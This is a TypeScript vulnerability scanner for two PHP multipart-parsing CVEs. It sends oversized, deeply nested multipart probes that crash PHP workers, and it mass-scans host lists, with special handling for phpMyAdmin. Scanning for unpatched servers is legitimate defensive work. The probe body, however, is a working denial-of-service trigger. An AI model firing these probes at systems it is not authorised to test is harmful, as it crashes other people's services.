#!/usr/bin/env bun

import { readFile, writeFile } from "node:fs/promises";

const CVES = "CVE-2026-109618 / CVE-2026-109619";
const DEFAULT_PATH = "/index.php";
const PHPMYADMIN_PATH = "/show_config_errors.php";
const CONTROL_BOUNDARY = "x";
const PROBE_BOUNDARY = "";
const CONTROL_BODY = new TextEncoder().encode("--x\nContent-Disposition:name=a;filename=\n\n");
const NESTED_KEYS = 62;
const BODY_READ_LIMIT = 1 << 20;
const EXCERPT_LIMIT = 2048;
const DEFAULT_TIMEOUT = 60;
const DEFAULT_USER_AGENT =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
  "(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 PHP2Shell/1.0.0";
const PROBES = [[1, 4000], [8, 1020], [20, 1020]] as const;
const REJECTED_STATUSES = new Set([400, 403, 411, 413, 414, 417, 422, 429, 431]);
const FIXED_VERSIONS = new Map([
  ["8.2", 35], ["8.3", 36], ["8.4", 27], ["8.5", 12],
]);
const VERSION_PATTERN = /PHP\/(\d+)\.(\d+)\.(\d+)/;
const SENSITIVE_HEADERS = new Set(["authorization", "cookie", "proxy-authorization", "set-cookie", "x-api-key"]);

type Sapi = "auto" | "mod_php" | "fpm";
type Verdict = "ERROR" | "INCONCLUSIVE" | "VULNERABLE" | "FIXED" | "NO SIGNAL";
type Signal =
  | "in_band_php_fatal"
  | "empty_500_differential"
  | "fpm_gateway_error"
  | "empty_200_differential"
  | "unpatched_version"
  | "patched_version"
  | "request_rejected"
  | "transport_error"
  | "no_signal"
  | null;
type Confidence = "high" | "medium" | "low" | null;

type CrashSignal = {
  sapi: string;
  signal: Exclude<Signal, null>;
  reason: string;
  confidence: Exclude<Confidence, null>;
};

type HttpResult = {
  statusCode: number | null;
  reason: string;
  headers: Headers;
  body: Uint8Array;
  bytesSent: number;
  error: string | null;
};

type ScanResult = {
  host: string;
  vulnerable: boolean | null;
  verdict: Verdict;
  status_code: number | null;
  error: string | null;
  reason: string | null;
  sapi: string | null;
  signal: Signal;
  confidence: Confidence;
  warnings: string[];
  powered_by: string | null;
  request: string | null;
  response: string | null;
  final_url: string | null;
  tested_url: string | null;
  control: Record<string, unknown> | null;
  probes: Record<string, unknown>[];
  timestamp: string;
};

const decoder = new TextDecoder();
const encoder = new TextEncoder();

function utcNow(): string {
  return new Date().toISOString();
}

function text(bytes: Uint8Array): string {
  return decoder.decode(bytes);
}

function colorize(value: string, color: string, enabled: boolean): string {
  return enabled ? `${color}${value}\x1b[0m` : value;
}

function parseHeaders(values: string[]): Record<string, string> {
  const result: Record<string, string> = {};
  for (const raw of values) {
    const separator = raw.indexOf(":");
    if (separator < 1) throw new Error(`invalid header ${JSON.stringify(raw)}; expected 'Key: Value'`);
    const name = raw.slice(0, separator).trim();
    const value = raw.slice(separator + 1).trimStart();
    if (!/^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$/.test(name)) throw new Error(`invalid header name ${JSON.stringify(name)}`);
    if (/[\r\n]/.test(value)) throw new Error(`invalid value for header ${JSON.stringify(name)}`);
    result[name] = value;
  }
  return result;
}

function hasHeader(headers: Record<string, string>, name: string): boolean {
  return Object.keys(headers).some((key) => key.toLowerCase() === name.toLowerCase());
}

function setHeader(headers: Record<string, string>, name: string, value: string): void {
  for (const key of Object.keys(headers)) if (key.toLowerCase() === name.toLowerCase()) delete headers[key];
  headers[name] = value;
}

function normalizeUrl(raw: string): string {
  const value = raw.trim();
  if (!value) throw new Error("invalid or empty URL");
  const url = new URL(value.includes("://") ? value : `https://${value}`);
  if (!["http:", "https:"].includes(url.protocol) || url.username || url.password) {
    throw new Error(url.username || url.password ? "credentials in URLs are not supported; use an Authorization header" : "invalid HTTP URL");
  }
  url.pathname = !url.pathname || url.pathname === "/" ? DEFAULT_PATH : url.pathname;
  url.search = "";
  url.hash = "";
  return url.toString();
}

function safeUrlLabel(raw: string): string {
  try {
    const url = new URL(raw.trim().includes("://") ? raw.trim() : `https://${raw.trim()}`);
    return `${url.protocol}//${url.host}${url.pathname}`;
  } catch {
    return "<invalid URL>";
  }
}

function replacePath(target: string, path: string): string {
  const url = new URL(target);
  url.pathname = path.startsWith("/") ? path : `/${path}`;
  url.search = "";
  url.hash = "";
  return url.toString();
}

function phpMyAdminTarget(target: string): string {
  return replacePath(target, PHPMYADMIN_PATH);
}

const probeCache = new Map<string, Uint8Array>();
function buildProbeBody(sizeMiB: number, parts: number): Uint8Array {
  const cacheKey = `${sizeMiB}:${parts}`;
  const cached = probeCache.get(cacheKey);
  if (cached) return cached;
  const size = sizeMiB << 20;
  const name = `a[]${"[a]".repeat(NESTED_KEYS)}`;
  const part = encoder.encode(`--\nContent-Disposition:name=${name};filename=\n\n`);
  const base = new Uint8Array(part.length * parts);
  for (let i = 0; i < parts; i++) base.set(part, i * part.length);
  if (size < base.length) throw new Error(`php2shell probe of ${size} bytes cannot hold ${parts} parts (${base.length} bytes)`);
  const filler = Math.floor((size - base.length) / 3);
  const body = new Uint8Array(filler * 3 + base.length);
  const fillerBytes = encoder.encode("x:\n");
  let offset = 0;
  body.set(encoder.encode("--\n"), offset); offset += 3;
  for (let i = 0; i < filler; i++) { body.set(fillerBytes, offset); offset += 3; }
  body.set(base.subarray(3), offset);
  const result = body.subarray(0, body.length - 1);
  probeCache.set(cacheKey, result);
  return result;
}

function requestHeaders(custom: Record<string, string>, boundary: string): Record<string, string> {
  const headers = { ...custom };
  for (const name of Object.keys(headers)) {
    if (["content-length", "transfer-encoding"].includes(name.toLowerCase())) delete headers[name];
  }
  if (!hasHeader(headers, "User-Agent")) headers["User-Agent"] = DEFAULT_USER_AGENT;
  setHeader(headers, "Content-Type", `multipart/form-data; boundary=${boundary}`);
  setHeader(headers, "Connection", "close");
  if (!hasHeader(headers, "Accept-Encoding")) headers["Accept-Encoding"] = "gzip";
  return headers;
}

async function sendPost(url: string, body: Uint8Array, boundary: string, custom: Record<string, string>, timeout: number, verifySsl: boolean): Promise<HttpResult> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout * 1000);
  try {
    const headers = requestHeaders(custom, boundary);
    const options: RequestInit & { tls?: { rejectUnauthorized: boolean } } = {
      method: "POST", headers, body, redirect: "manual", signal: controller.signal,
    };
    if (url.startsWith("https:") && !verifySsl) options.tls = { rejectUnauthorized: false };
    const response = await fetch(url, options);
    const raw = await readResponseBody(response);
    return {
      statusCode: response.status, reason: response.statusText, headers: response.headers,
      body: raw, bytesSent: body.byteLength, error: null,
    };
  } catch (error) {
    const message = error instanceof DOMException && error.name === "AbortError" ? "request timed out" : error instanceof Error ? error.message : String(error);
    return { statusCode: null, reason: "", headers: new Headers(), body: new Uint8Array(), bytesSent: body.byteLength, error: message };
  } finally {
    clearTimeout(timer);
  }
}

async function readResponseBody(response: Response): Promise<Uint8Array> {
  if (!response.body) return new Uint8Array();
  const reader = response.body.getReader();
  const chunks: Uint8Array[] = [];
  let total = 0;
  try {
    while (total < BODY_READ_LIMIT) {
      const { done, value } = await reader.read();
      if (done || !value) break;
      const remaining = BODY_READ_LIMIT - total;
      const chunk = value.byteLength > remaining ? value.subarray(0, remaining) : value;
      chunks.push(chunk);
      total += chunk.byteLength;
      if (chunk.byteLength < value.byteLength || total === BODY_READ_LIMIT) break;
    }
  } finally {
    await reader.cancel().catch(() => {});
  }
  const result = new Uint8Array(total);
  let offset = 0;
  for (const chunk of chunks) {
    result.set(chunk, offset);
    offset += chunk.byteLength;
  }
  return result;
}

function poweredBy(response: HttpResult): string {
  return response.headers.get("x-powered-by") ?? "";
}

function versionVerdict(value: string): "FIXED" | "VULNERABLE" | null {
  const match = VERSION_PATTERN.exec(value);
  if (!match) return null;
  const fixed = FIXED_VERSIONS.get(`${match[1]}.${match[2]}`);
  if (fixed === undefined) return null;
  return Number(match[3]) >= fixed ? "FIXED" : "VULNERABLE";
}

function crashSignal(control: HttpResult, probe: HttpResult, sapi: Sapi): CrashSignal | null {
  const body = text(probe.body);
  if (body.includes("Allowed memory size of ") && body.includes(" bytes exhausted") && body.includes("Unknown")) {
    return {
      sapi: sapi === "fpm" ? "PHP-FPM" : sapi === "mod_php" ? "mod_php" : "mod_php/PHP-FPM",
      signal: "in_band_php_fatal",
      reason: "in-band PHP fatal error (memory exhausted in Unknown) raised while parsing the multipart body",
      confidence: "high",
    };
  }
  if (probe.statusCode === 500 && control.body.length > 0 && probe.body.length === 0) {
    return {
      sapi: sapi === "fpm" ? "PHP-FPM" : sapi === "mod_php" ? "mod_php" : "mod_php/PHP-FPM",
      signal: "empty_500_differential",
      reason: "HTTP 500 with an empty body although the control request produced output",
      confidence: "medium",
    };
  }
  if (sapi === "mod_php") return null;
  if ([502, 503, 504].includes(probe.statusCode ?? -1)) {
    return {
      sapi: "PHP-FPM",
      signal: "fpm_gateway_error",
      reason: `HTTP ${probe.statusCode} from the web server fronting PHP-FPM (worker died mid-request)`,
      confidence: "medium",
    };
  }
  if (probe.statusCode === 200 && control.body.length > 0 && probe.body.length === 0) {
    return {
      sapi: "PHP-FPM",
      signal: "empty_200_differential",
      reason: "HTTP 200 with an empty body although the control request produced output (worker died mid-request)",
      confidence: "medium",
    };
  }
  return null;
}

function baseResult(host: string): ScanResult {
  return { host, vulnerable: null, verdict: "ERROR", status_code: null, error: null, reason: null, sapi: null, signal: null, confidence: null, warnings: [], powered_by: null, request: null, response: null, final_url: null, tested_url: null, control: null, probes: [], timestamp: utcNow() };
}

function responseDump(response: HttpResult): string | null {
  if (response.statusCode === null) return null;
  const lines = [`HTTP/1.1 ${response.statusCode} ${response.reason}`];
  for (const [name, value] of response.headers) lines.push(`${name}: ${SENSITIVE_HEADERS.has(name.toLowerCase()) ? "<redacted>" : value}`);
  return `${lines.join("\r\n")}\r\n\r\n${text(response.body.subarray(0, EXCERPT_LIMIT))}`;
}

function metadata(response: HttpResult): Record<string, unknown> {
  return { status_code: response.statusCode, response_bytes: response.body.length, bytes_sent: response.bytesSent, error: response.error, description: response.error ? `request failed after sending ${response.bytesSent} bytes: ${response.error}` : `HTTP ${response.statusCode}, ${response.body.length} byte response (sent ${response.bytesSent} bytes)` };
}

function requestDump(url: string, headers: Record<string, string>, bodySize: number, description: string): string {
  const parsed = new URL(url);
  const lines = [`POST ${parsed.pathname || "/"}${parsed.search} HTTP/1.1`, `Host: ${parsed.host}`];
  for (const [name, value] of Object.entries(headers)) lines.push(`${name}: ${SENSITIVE_HEADERS.has(name.toLowerCase()) ? "<redacted>" : value}`);
  lines.push(`Content-Length: ${bodySize}`);
  return `${lines.join("\r\n")}\r\n\r\n<${description}; ${bodySize} bytes>`;
}

async function checkUrl(host: string, initialTarget: string, timeout: number, verifySsl: boolean, custom: Record<string, string>, sapi: Sapi): Promise<ScanResult> {
  const result = baseResult(host); result.tested_url = initialTarget; result.final_url = initialTarget;
  let target = initialTarget;
  const doControl = async () => sendPost(target, CONTROL_BODY, CONTROL_BOUNDARY, custom, timeout, verifySsl);
  let control = await doControl();
  result.request = requestDump(target, requestHeaders(custom, CONTROL_BOUNDARY), CONTROL_BODY.length, "minimal multipart control body");
  result.status_code = control.statusCode; result.response = responseDump(control); result.control = metadata(control);
  if (control.error) { result.error = `control request failed: ${control.error}`; result.reason = result.error; return result; }
  if ((control.statusCode ?? 0) >= 500) { result.verdict = "INCONCLUSIVE"; result.error = `control request returned HTTP ${control.statusCode}`; result.reason = result.error; return result; }
  const bodyText = text(control.body);
  if (bodyText.includes("phpMyAdmin")) {
    target = phpMyAdminTarget(target); result.final_url = target; control = await doControl();
    result.request = requestDump(target, requestHeaders(custom, CONTROL_BOUNDARY), CONTROL_BODY.length, "minimal multipart control body");
    result.status_code = control.statusCode; result.response = responseDump(control); result.control = metadata(control);
    if (control.error) { result.error = `phpMyAdmin control request failed: ${control.error}`; result.reason = result.error; return result; }
    if ((control.statusCode ?? 0) >= 500) { result.verdict = "INCONCLUSIVE"; result.error = `phpMyAdmin control request returned HTTP ${control.statusCode}`; result.reason = result.error; return result; }
  }
  let advertised = "";
  let rejectedReason: string | null = null;
  for (let index = 0; index < PROBES.length; index++) {
    const [sizeMiB, parts] = PROBES[index]; const body = buildProbeBody(sizeMiB, parts);
    const probe = await sendPost(target, body, PROBE_BOUNDARY, custom, timeout, verifySsl);
    result.probes.push({ ...metadata(probe), probe: index + 1, size_mib: sizeMiB, parts });
    result.request = requestDump(target, requestHeaders(custom, PROBE_BOUNDARY), body.length, `php2shell probe ${index + 1}: ${sizeMiB} MiB, ${parts} parts, ${NESTED_KEYS} nested keys`);
    result.status_code = probe.statusCode; result.response = responseDump(probe);
    advertised = poweredBy(probe) || advertised; result.powered_by = advertised || null;
    if (probe.error) { result.verdict = "INCONCLUSIVE"; result.signal = "transport_error"; result.confidence = "low"; result.error = `probe ${index + 1} failed before a response was read: ${probe.error}`; result.reason = result.error; return result; }
    if (REJECTED_STATUSES.has(probe.statusCode ?? -1)) {
      rejectedReason = `probe ${index + 1} was rejected with HTTP ${probe.statusCode} before PHP parsed it`;
      break;
    }
    const crash = crashSignal(control, probe, sapi);
    if (crash) {
      result.vulnerable = true; result.verdict = "VULNERABLE"; result.sapi = crash.sapi;
      result.signal = crash.signal; result.confidence = crash.confidence;
      result.reason = `probe ${index + 1} (${sizeMiB} MiB, ${parts} parts) crashed the request handler: ${crash.reason}`;
      if (versionVerdict(advertised) === "FIXED") result.warnings.push("Dynamic crash signal conflicts with the advertised patched PHP version; verify memory_limit and vendor backports.");
      return result;
    }
    if (versionVerdict(advertised) === "FIXED") {
      result.vulnerable = false; result.verdict = "FIXED"; result.signal = "patched_version"; result.confidence = "high";
      result.reason = `no crash observed and X-Powered-By reports a patched release: ${advertised}`; return result;
    }
  }
  result.powered_by = advertised || null;
  const byVersion = versionVerdict(advertised);
  if (byVersion === "VULNERABLE") {
    result.vulnerable = true; result.verdict = "VULNERABLE"; result.sapi = sapi === "auto" ? "unknown" : sapi === "fpm" ? "PHP-FPM" : "mod_php";
    result.signal = "unpatched_version"; result.confidence = "medium"; result.reason = `no crash observed; X-Powered-By reports an unpatched release: ${advertised}`;
  } else if (byVersion === "FIXED") {
    result.vulnerable = false; result.verdict = "FIXED"; result.signal = "patched_version"; result.confidence = "high"; result.reason = `no crash observed and X-Powered-By reports a patched release: ${advertised}`;
  } else if (rejectedReason) {
    result.verdict = "INCONCLUSIVE"; result.signal = "request_rejected"; result.confidence = "low"; result.error = rejectedReason; result.reason = rejectedReason;
  } else {
    result.vulnerable = false; result.verdict = "NO SIGNAL"; result.signal = "no_signal"; result.confidence = null; result.reason = "no crash observed and no PHP version advertised";
  }
  return result;
}

async function checkVulnerability(host: string, timeout: number, verifySsl: boolean, custom: Record<string, string>, sapi: Sapi, paths: string[]): Promise<ScanResult> {
  const display = safeUrlLabel(host);
  let normalized: string;
  try { normalized = normalizeUrl(host); } catch (error) { const result = baseResult(display); result.error = error instanceof Error ? error.message : String(error); result.reason = result.error; return result; }
  const targets = paths.length ? paths.map((path) => replacePath(normalized, path)) : [normalized];
  let fallback: ScanResult | null = null;
  const priority: Record<string, number> = { "NO SIGNAL": 0, FIXED: 1, INCONCLUSIVE: 2, ERROR: 2 };
  for (const target of targets) {
    const result = await checkUrl(normalized, target, timeout, verifySsl, custom, sapi);
    if (result.vulnerable === true) return result;
    if (!fallback || (priority[result.verdict] ?? 0) > (priority[fallback.verdict] ?? 0)) fallback = result;
  }
  return fallback ?? baseResult(normalized);
}

function loadLines(path: string): Promise<string[]> {
  return readFile(path, "utf8").then((content) => content.split(/\r?\n/).map((line) => line.trim()).filter((line) => line && !line.startsWith("#")));
}

function deduplicate(hosts: string[]): string[] {
  const seen = new Set<string>(); const result: string[] = [];
  for (const host of hosts) {
    let key = safeUrlLabel(host);
    try { const url = new URL(normalizeUrl(host)); key = `${url.protocol}//${url.host.toLowerCase()}${url.pathname}`; } catch {}
    if (!seen.has(key)) { seen.add(key); result.push(host); }
  }
  return result;
}

function argValue(args: string[], index: number): [string, number] {
  const value = args[index + 1]; if (!value || value.startsWith("-")) throw new Error(`missing value for ${args[index]}`); return [value, index + 1];
}

async function main(): Promise<void> {
  const args = Bun.argv.slice(2); let url: string | null = null; let list: string | null = null; let threads = 10; let timeout = DEFAULT_TIMEOUT; let output: string | null = null; let allResults = false; let insecure = false; let verbose = false; let quiet = false; let noColor = false; let sapi: Sapi = "auto"; const headers: string[] = []; const paths: string[] = []; let pathFile: string | null = null;
  for (let i = 0; i < args.length; i++) {
    const arg = args[i];
    if (arg === "-u" || arg === "--url") [url, i] = argValue(args, i);
    else if (arg === "-l" || arg === "--list") [list, i] = argValue(args, i);
    else if (arg === "-t" || arg === "--threads") { const [value, next] = argValue(args, i); threads = Number(value); i = next; }
    else if (arg === "--timeout") { const [value, next] = argValue(args, i); timeout = Number(value); i = next; }
    else if (arg === "-o" || arg === "--output") [output, i] = argValue(args, i);
    else if (arg === "--all-results") allResults = true;
    else if (arg === "-k" || arg === "--insecure") insecure = true;
    else if (arg === "-H" || arg === "--header") { const [value, next] = argValue(args, i); headers.push(value); i = next; }
    else if (arg === "-v" || arg === "--verbose") verbose = true;
    else if (arg === "-q" || arg === "--quiet") quiet = true;
    else if (arg === "--no-color") noColor = true;
    else if (arg === "--sapi") { const [value, next] = argValue(args, i); if (!["auto", "mod_php", "fpm"].includes(value)) throw new Error("--sapi must be auto, mod_php, or fpm"); sapi = value as Sapi; i = next; }
    else if (arg === "--path") { const [value, next] = argValue(args, i); paths.push(value); i = next; }
    else if (arg === "--path-file") [pathFile, i] = argValue(args, i);
    else if (arg === "-h" || arg === "--help") { console.log(`php2shell Bun scanner (${CVES})\nUsage: bun run scanner.ts -u URL | -l FILE [options]\nOptions: -t N --timeout N -o FILE --all-results -k -H 'Key: Value' -v -q --no-color --sapi auto|mod_php|fpm --path PATH --path-file FILE`); return; }
    else throw new Error(`unknown argument: ${arg}`);
  }
  if ((url ? 1 : 0) + (list ? 1 : 0) !== 1) throw new Error("exactly one of --url or --list is required");
  if (!Number.isInteger(threads) || threads < 1 || !Number.isInteger(timeout) || timeout < 1) throw new Error("threads and timeout must be positive integers");
  const custom = parseHeaders(headers); const loaded = list ? await loadLines(list) : [url!]; const hosts = deduplicate(loaded);
  const selectedPaths = pathFile ? await loadLines(pathFile) : paths; if (!hosts.length) throw new Error("No hosts to scan");
  const results: ScanResult[] = []; let cursor = 0;
  async function worker() { while (cursor < hosts.length) { const host = hosts[cursor++]; try { results.push(await checkVulnerability(host, timeout, !insecure, custom, sapi, selectedPaths)); } catch (error) { const result = baseResult(safeUrlLabel(host)); result.error = `unexpected error: ${error instanceof Error ? error.message : String(error)}`; result.reason = result.error; results.push(result); } } }
  await Promise.all(Array.from({ length: Math.min(threads, hosts.length) }, worker));
  const color = !noColor && process.stdout.isTTY; const red = "\x1b[91m", green = "\x1b[92m", yellow = "\x1b[93m";
  for (const result of results) {
    if (quiet && result.vulnerable !== true) continue;
    const label = result.vulnerable === true ? colorize("[VULNERABLE]", `${red}\x1b[1m`, color) : result.vulnerable === false ? colorize("[NOT VULNERABLE]", green, color) : colorize(`[${result.verdict}]`, yellow, color);
    console.log(`${label} ${result.host} - ${result.verdict}${result.status_code ? ` - Status: ${result.status_code}` : ""}`);
    if (result.final_url !== result.tested_url) console.log(`  -> Retargeted to: ${result.final_url}`);
    if (verbose && result.reason) console.log(`  -> ${result.reason}`);
  }
  const vulnerable = results.filter((result) => result.vulnerable === true).length;
  if (!quiet) console.log(`\nSCAN SUMMARY\n  Total hosts scanned: ${results.length}\n  Vulnerable: ${vulnerable}\n  Not vulnerable: ${results.filter((result) => result.vulnerable === false).length}\n  Inconclusive/errors: ${results.filter((result) => result.vulnerable === null).length}`);
  if (output) {
    const selected = allResults ? results : results.filter((result) => result.vulnerable === true);
    await writeFile(output, JSON.stringify({ scan_time: utcNow(), total_results: selected.length, results: selected }, null, 2));
    if (!quiet) console.log(`Results saved to: ${output}`);
  }
  process.exitCode = vulnerable ? 1 : 0;
}

if (import.meta.main) main().catch((error) => { console.error(`[ERROR] ${error instanceof Error ? error.message : String(error)}`); process.exitCode = 2; });

export { buildProbeBody, crashSignal, readResponseBody, versionVerdict };
